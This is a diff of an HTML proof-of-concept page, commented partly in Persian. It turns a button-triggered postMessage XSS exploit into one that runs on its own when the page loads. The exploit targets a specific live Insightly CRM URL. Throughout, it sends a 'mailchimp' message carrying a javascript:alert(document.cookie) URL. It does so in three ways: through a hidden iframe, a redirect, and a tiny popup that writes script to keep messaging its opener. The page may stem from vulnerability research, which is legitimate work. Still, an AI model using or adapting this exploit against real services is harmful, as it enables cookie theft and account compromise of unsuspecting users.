@@ -1,77 +1,135 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>PostMessage XSS - Tab-Under Fixed</title>
+  <title>Auto PostMessage XSS PoC</title>
   <style>
-    body { font-family: Arial; text-align: center; margin-top: 100px; background: #f4f4f4; }
-    button { padding: 15px 30px; font-size: 18px; background: #e74c3c; color: #fff; border: none; border-radius: 6px; cursor: pointer; }
-    #log { margin-top: 20px; background: #fff; border: 1px solid #ccc; padding: 10px; width: 80%; margin: 20px auto; text-align: left; font-family: monospace; max-height: 200px; overflow: auto; }
+    body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
+    #status { padding: 15px; background: #161b22; border-radius: 6px; margin: 20px 0; }
+    .success { color: #3fb950; }
+    .fail { color: #f85149; }
+    iframe { display: none; }
   </style>
 </head>
 <body>
-  <h1>🚨 PostMessage XSS (Tab-Under - Fixed)</h1>
-  <p>Click the button – alert should appear on insightly.com</p>
-  <button id="exploitBtn">Run Exploit</button>
+  <h2>🔍 Auto PostMessage XSS Tester</h2>
+  <div id="status">⏳ در حال تلاش برای اجرای خودکار...</div>
   <div id="log"></div>
 
+  <!-- iframe برای تست اگر هدف اجازه framing بدهد -->
+  <iframe id="targetFrame" sandbox="allow-scripts allow-same-origin"></iframe>
+
   <script>
-    const TARGET_URL = "https://crm.na1.insightly.com/list/Organisation/ALL?blade=/details/organisation/174120691";
+    const TARGET = "https://crm.na1.insightly.com/list/Organisation/ALL?blade=/details/organisation/174120691";
     const PAYLOAD = "javascript:alert(document.cookie)";
+    const TARGET_ORIGIN = "https://crm.na1.insightly.com";
 
-    function log(msg) {
-      const logDiv = document.getElementById('log');
+    function log(msg, type = 'info') {
+      const d = document.getElementById('log');
       const time = new Date().toLocaleTimeString();
-      logDiv.innerHTML += `[${time}] ${msg}<br>`;
-      console.log(msg);
+      d.innerHTML += `<div style="color:${type==='error'?'#f85149':'#8b949e'}">[${time}] ${msg}</div>`;
+      console.log(`[${type}] ${msg}`);
     }
 
-    function sendMessages(targetWindow) {
-      let count = 0;
-      const maxAttempts = 15;
-      const interval = setInterval(() => {
-        try {
-          targetWindow.postMessage({ type: "mailchimp", url: PAYLOAD }, "*");
-          log(`✅ Payload sent (${count+1}/${maxAttempts})`);
-        } catch (err) {
-          log(`❌ Error: ${err.message}`);
-        }
-        count++;
-        if (count >= maxAttempts) clearInterval(interval);
-      }, 1500); // هر ۱.۵ ثانیه یکبار
+    function sendPayload(win, origin = "*") {
+      try {
+        win.postMessage({ type: "mailchimp", url: PAYLOAD }, origin);
+        log(`✅ Payload sent to ${win === window ? 'self' : 'iframe/window'}`);
+        return true;
+      } catch(e) {
+        log(`❌ Send failed: ${e.message}`, 'error');
+        return false;
+      }
     }
 
-    if (window.opener) {
-      // Helper window
-      log("Helper: waiting for opener to load target...");
-      // تأخیر بیشتر برای اطمینان از بارگذاری کامل صفحه هدف در opener
+    // استراتژی ۱: تلاش با iframe (اگر هدف X-Frame-Options نداشته باشد)
+    function tryIframe() {
+      log("🔄 استراتژی ۱: تست با iframe...");
+      const iframe = document.getElementById('targetFrame');
+      
+      // اگر هدف اجازه framing بدهد، می‌توانیم مستقیم postMessage بفرستیم
+      iframe.onload = () => {
+        log("✅ iframe loaded - attempting postMessage...");
+        // ارسال به iframe (نیاز به دانستن exact origin دارد)
+        sendPayload(iframe.contentWindow, TARGET_ORIGIN);
+      };
+      
+      iframe.onerror = () => {
+        log("❌ iframe blocked (X-Frame-Options/CSP)", 'error');
+        tryRedirect();
+      };
+      
+      // لود iframe - اگر هدف اجازه ندهد، onerror صدا زده می‌شود
+      try {
+        iframe.src = TARGET;
+      } catch(e) {
+        log("❌ Cannot set iframe src - cross-origin restriction", 'error');
+        tryRedirect();
+      }
+    }
+
+    // استراتژی ۲: ریدایرکت تب فعلی + ارسال پیام قبل از ناورگیشن
+    function tryRedirect() {
+      log("🔄 استراتژی ۲: ریدایرکت + ارسال فوری...");
+      
+      // ارسال پیام به خودمان قبل از ریدایرکت (اگر هدف listener روی window داشته باشد)
+      // این فقط کار می‌کند اگر کاربر از قبل تب هدف را باز کرده باشد
+      sendPayload(window, TARGET_ORIGIN);
+      
+      // ریدایرکت فوری
       setTimeout(() => {
-        if (window.opener && !window.opener.closed) {
-          log("Helper: sending payloads to opener...");
-          sendMessages(window.opener);
-          // بستن helper بعد از چند ثانیه
-          setTimeout(() => window.close(), 5000);
-        } else {
-          log("Helper: opener not available.");
-        }
-      }, 4000); // ۴ ثانیه صبر
-    } else {
-      // Main window
-      log("Main: ready. Click button to start tab-under.");
-      document.getElementById('exploitBtn').addEventListener('click', () => {
-        log("Main: opening helper window...");
-        const helper = window.open(location.href, "helperWindow");
-        if (!helper) {
-          log("ERROR: Popup blocked! Please allow popups for this site.");
-          alert("Please allow popups and try again.");
-          return;
-        }
-        log("Main: redirecting main tab to target...");
-        location.href = TARGET_URL;
-        // Main tab will now navigate away, helper takes over
-      });
+        log("🔄 Navigating to target...");
+        location.replace(TARGET);
+      }, 100);
     }
+
+    // استراتژی ۳: تلاش برای window.open با کمترین تاخیر (شانس کم در مرورگرهای جدید)
+    function tryAutoOpen() {
+      log("🔄 استراتژی ۳: window.open با تاخیر حداقل...");
+      
+      // برخی مرورگرهای قدیمی اگر زیر ۱ ثانیه بعد از load باشد، اجازه می‌دهند
+      const helper = window.open('', '_blank', 'width=1,height=1');
+      
+      if (helper && !helper.closed) {
+        log("✅ window.open succeeded (legacy browser?)");
+        helper.document.write(`
+          <script>
+            setTimeout(() => {
+              for(let i=0; i<5; i++) {
+                setTimeout(() => {
+                  window.opener?.postMessage({type:"mailchimp", url:"${PAYLOAD}"}, "*");
+                }, i*500);
+              }
+            }, 2000);
+          <\/script>
+        `);
+        helper.document.close();
+        location.href = TARGET;
+      } else {
+        log("❌ window.open blocked - requires user gesture", 'error');
+        document.getElementById('status').innerHTML = 
+          `<span class="fail">❌ نیاز به کلیک کاربر دارد.</span><br>
+           <small>مرورگرهای مدرن User Activation را اجباری کرده‌اند.</small>`;
+      }
+    }
+
+    // اجرای خودکار به محض لود صفحه
+    document.addEventListener('DOMContentLoaded', () => {
+      log("🚀 Auto-execution started...");
+      
+      // ترتیب تلاش: iframe → redirect → auto-open
+      tryIframe();
+      
+      // اگر iframe بعد از ۳ ثانیه لود نشد، استراتژی بعدی
+      setTimeout(() => {
+        if (document.getElementById('targetFrame').contentDocument?.location?.href === 'about:blank') {
+          tryRedirect();
+        }
+      }, 3000);
+      
+      // تلاش آخر با تاخیر بسیار کم (شانس کم)
+      setTimeout(tryAutoOpen, 500);
+    });
   </script>
 </body>
 </html>
